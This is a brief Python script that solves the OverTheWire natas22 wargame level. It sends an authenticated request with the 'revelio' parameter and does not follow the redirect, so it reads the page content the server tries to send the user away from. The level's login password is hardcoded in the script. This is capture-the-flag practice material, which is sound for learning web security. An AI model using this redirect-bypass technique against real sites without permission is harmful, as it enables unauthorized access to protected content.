import requests


url='http://natas22.natas.labs.overthewire.org/index.php?revelio'
auth=('natas22','chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ')
s=requests.Session()
resp=s.get(url, auth=auth,allow_redirects=False)
print(resp.text)
s.close()
